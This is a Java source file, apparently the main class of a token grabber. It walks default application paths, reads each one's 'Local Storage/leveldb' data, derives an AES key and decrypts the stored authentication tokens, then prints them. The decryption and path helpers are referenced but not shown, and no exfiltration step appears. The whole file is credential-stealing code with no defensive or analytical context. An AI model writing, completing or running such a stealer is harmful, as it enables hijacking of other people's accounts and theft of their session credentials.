import java.nio.file.Paths;
import java.util.Set;
import java.util.HashSet;

public class Main {
    private static Set<String> tokens = new HashSet<>();

    public static void main(String[] args) {
        getClientTokens();
        for (String token : tokens) {
            System.out.println("Token: " + token);
        }
        System.exit(0);
    }

    private static void getClientTokens() {
        DefaultPaths.getDefaultPaths().forEach(path ->
            tokens.addAll(Decryptor.decryptTokens(
                    Paths.get(path, "Local Storage", "leveldb").toString(),
                    Decryptor.getAESKey(path))
            )
        );
    }
}